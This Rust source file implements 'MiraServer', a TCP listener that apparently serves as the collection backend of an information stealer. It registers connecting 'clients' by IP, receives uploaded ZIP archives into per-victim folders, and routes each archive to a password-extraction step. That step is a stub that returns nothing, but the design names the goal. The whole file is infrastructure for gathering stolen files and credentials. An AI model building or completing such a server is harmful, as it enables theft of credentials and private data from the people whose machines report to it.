use std::sync::Arc;
use tokio::net::{TcpListener, TcpStream};
use tokio::sync::{broadcast, RwLock};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use anyhow::{Result, Context};
use crate::{ClientManager, MiraEvent, LogEntry, ClientInfo, FileTransfer, TransferStatus, PasswordEntry, parse_client_data, format_file_size};
use uuid::Uuid;
use chrono::Utc;
use std::path::Path;

/// Main server implementation that handles TCP connections and client management
#[derive(Debug)]
pub struct MiraServer {
    client_manager: Arc<ClientManager>,
    event_sender: broadcast::Sender<MiraEvent>,
    is_running: Arc<RwLock<bool>>,
    port: u16,
}

impl MiraServer {
    pub fn new() -> (Self, broadcast::Receiver<MiraEvent>) {
        let (event_sender, event_receiver) = broadcast::channel(1024);
        
        let server = Self {
            client_manager: Arc::new(ClientManager::new()),
            event_sender,
            is_running: Arc::new(RwLock::new(false)),
            port: 0,
        };
        
        (server, event_receiver)
    }

    /// Start the server on the specified port
    pub async fn start(&mut self, port: u16) -> Result<()> {
        let addr = format!("0.0.0.0:{}", port);
        let listener = TcpListener::bind(&addr).await
            .context(format!("Failed to bind to {}", addr))?;
        
        self.port = port;
        *self.is_running.write().await = true;
        
        // Send server started event
        let _ = self.event_sender.send(MiraEvent::ServerStarted(port));
        let _ = self.event_sender.send(MiraEvent::LogEntry(
            LogEntry::system(format!("Server started on port {}", port))
        ));

        tracing::info!("MiraServer started on port {}", port);

        // Main server loop
        while *self.is_running.read().await {
            tokio::select! {
                // Accept new connections
                result = listener.accept() => {
                    match result {
                        Ok((stream, addr)) => {
                            let client_ip = addr.ip().to_string();
                            let _ = self.event_sender.send(MiraEvent::LogEntry(
                                LogEntry::connection(format!("Client connected: {}", client_ip))
                            ));
                            
                            // Handle client in separate task
                            let client_manager = Arc::clone(&self.client_manager);
                            let event_sender = self.event_sender.clone();
                            tokio::spawn(async move {
                                if let Err(e) = handle_client(stream, client_ip, client_manager, event_sender).await {
                                    tracing::error!("Error handling client: {}", e);
                                }
                            });
                        }
                        Err(e) => {
                            tracing::error!("Failed to accept connection: {}", e);
                            let _ = self.event_sender.send(MiraEvent::LogEntry(
                                LogEntry::error(format!("Failed to accept connection: {}", e))
                            ));
                        }
                    }
                }
            }
        }

        Ok(())
    }

    /// Stop the server
    pub async fn stop(&self) -> Result<()> {
        *self.is_running.write().await = false;
        
        let _ = self.event_sender.send(MiraEvent::ServerStopped);
        let _ = self.event_sender.send(MiraEvent::LogEntry(
            LogEntry::system("Server stopped".to_string())
        ));
        
        tracing::info!("MiraServer stopped");
        Ok(())
    }

    /// Get client manager reference
    pub fn client_manager(&self) -> Arc<ClientManager> {
        Arc::clone(&self.client_manager)
    }

    /// Get current port
    pub fn port(&self) -> u16 {
        self.port
    }

    /// Check if server is running
    pub async fn is_running(&self) -> bool {
        *self.is_running.read().await
    }
}

/// Handle an individual client connection
async fn handle_client(
    mut stream: TcpStream, 
    client_ip: String,
    client_manager: Arc<ClientManager>,
    event_sender: broadcast::Sender<MiraEvent>
) -> Result<()> {
    let mut buffer = vec![0; 8192];
    let mut receiving_file = false;
    let mut file_transfer: Option<FileTransfer> = None;
    let mut file_data = Vec::new();
    
    // Create client directory
    let client_dir = format!("Clients/{}", client_ip.replace('.', "_"));
    tokio::fs::create_dir_all(&client_dir).await
        .context("Failed to create client directory")?;

    loop {
        match stream.read(&mut buffer).await {
            Ok(0) => {
                // Connection closed
                let _ = event_sender.send(MiraEvent::ClientDisconnected(client_ip.clone()));
                let _ = event_sender.send(MiraEvent::LogEntry(
                    LogEntry::connection(format!("Client disconnected: {}", client_ip))
                ));
                break;
            }
            Ok(bytes_read) => {
                let data = &buffer[..bytes_read];
                
                if !receiving_file {
                    // Parse initial data
                    let data_str = String::from_utf8_lossy(data);
                    
                    if data_str.starts_with("DATA:") {
                        // Parse client data
                        let client_data = &data_str[5..]; // Skip "DATA:" prefix
                        
                        if let Ok(client_info) = parse_client_data(&client_ip, client_data) {
                            client_manager.add_client(client_info.clone()).await?;
                            let _ = event_sender.send(MiraEvent::ClientConnected(client_info));
                            let _ = event_sender.send(MiraEvent::LogEntry(
                                LogEntry::data_transfer(format!("Client data received from {}", client_ip))
                            ));
                        }
                        
                        // Check for file header
                        if let Some(file_start) = data_str.find("FILE:") {
                            let file_header = &data_str[file_start + 5..];
                            if let Some(size_end) = file_header.find(':') {
                                if let Ok(file_size) = file_header[..size_end].parse::<u64>() {
                                    let transfer = FileTransfer {
                                        id: Uuid::new_v4(),
                                        client_ip: client_ip.clone(),
                                        filename: format!("{}_{}.zip", client_ip, Utc::now().format("%Y%m%d_%H%M%S")),
                                        size: file_size,
                                        received_bytes: 0,
                                        started_at: Utc::now(),
                                        completed_at: None,
                                        status: TransferStatus::InProgress,
                                    };
                                    
                                    let _ = event_sender.send(MiraEvent::FileTransferStarted(transfer.clone()));
                                    let _ = event_sender.send(MiraEvent::LogEntry(
                                        LogEntry::data_transfer(format!(
                                            "Starting file transfer from {}: {}, size: {}",
                                            client_ip,
                                            transfer.filename,
                                            format_file_size(file_size)
                                        ))
                                    ));
                                    
                                    receiving_file = true;
                                    file_transfer = Some(transfer);
                                    file_data.clear();
                                    
                                    // Add any file data that came with the header
                                    let file_data_start = file_start + 5 + size_end + 1;
                                    if file_data_start < data.len() {
                                        file_data.extend_from_slice(&data[file_data_start..]);
                                    }
                                }
                            }
                        }
                    } else if data_str.starts_with("FILE:") {
                        // Direct file transfer
                        let file_header = &data_str[5..];
                        if let Some(size_end) = file_header.find(':') {
                            if let Ok(file_size) = file_header[..size_end].parse::<u64>() {
                                let transfer = FileTransfer {
                                    id: Uuid::new_v4(),
                                    client_ip: client_ip.clone(),
                                    filename: format!("{}_{}.zip", client_ip, Utc::now().format("%Y%m%d_%H%M%S")),
                                    size: file_size,
                                    received_bytes: 0,
                                    started_at: Utc::now(),
                                    completed_at: None,
                                    status: TransferStatus::InProgress,
                                };
                                
                                let _ = event_sender.send(MiraEvent::FileTransferStarted(transfer.clone()));
                                receiving_file = true;
                                file_transfer = Some(transfer);
                                file_data.clear();
                                
                                // Add any file data that came with the header
                                let file_data_start = 5 + size_end + 1;
                                if file_data_start < data.len() {
                                    file_data.extend_from_slice(&data[file_data_start..]);
                                }
                            }
                        }
                    }
                } else {
                    // Receiving file data
                    file_data.extend_from_slice(data);
                    
                    if let Some(ref mut transfer) = file_transfer {
                        transfer.received_bytes = file_data.len() as u64;
                        
                        // Send progress update
                        let _ = event_sender.send(MiraEvent::FileTransferProgress(
                            client_ip.clone(),
                            transfer.received_bytes,
                            transfer.size
                        ));
                        
                        // Check if transfer is complete
                        if transfer.received_bytes >= transfer.size {
                            // Save file
                            let file_path = format!("{}/{}", client_dir, transfer.filename);
                            tokio::fs::write(&file_path, &file_data).await
                                .context("Failed to save file")?;
                            
                            transfer.completed_at = Some(Utc::now());
                            transfer.status = TransferStatus::Completed;
                            
                            let _ = event_sender.send(MiraEvent::FileTransferCompleted(
                                client_ip.clone(),
                                transfer.filename.clone()
                            ));
                            let _ = event_sender.send(MiraEvent::LogEntry(
                                LogEntry::data_transfer(format!(
                                    "File transfer completed from {}: {} ({})",
                                    client_ip,
                                    transfer.filename,
                                    format_file_size(transfer.size)
                                ))
                            ));
                            
                            // Process the file for passwords if it's a ZIP
                            if file_path.ends_with(".zip") {
                                if let Ok(passwords) = extract_passwords_from_zip(&file_path, &client_ip).await {
                                    if !passwords.is_empty() {
                                        let _ = event_sender.send(MiraEvent::PasswordsExtracted(passwords));
                                    }
                                }
                            }
                            
                            receiving_file = false;
                            file_transfer = None;
                            file_data.clear();
                            break;
                        }
                    }
                }
            }
            Err(e) => {
                let error_msg = format!("Error reading from client {}: {}", client_ip, e);
                let _ = event_sender.send(MiraEvent::LogEntry(LogEntry::error(error_msg)));
                break;
            }
        }
    }

    Ok(())
}

/// Extract passwords from a ZIP file
async fn extract_passwords_from_zip(zip_path: &str, client_ip: &str) -> Result<Vec<PasswordEntry>> {
    let file = tokio::fs::File::open(zip_path).await?;
    let mut passwords = Vec::new();
    
    // Note: This is a simplified version. In a real implementation,
    // you'd use the zip crate to properly extract and parse password files
    // For now, we'll return an empty vector
    
    Ok(passwords)
}

impl Default for MiraServer {
    fn default() -> Self {
        let (server, _) = Self::new();
        server
    }
}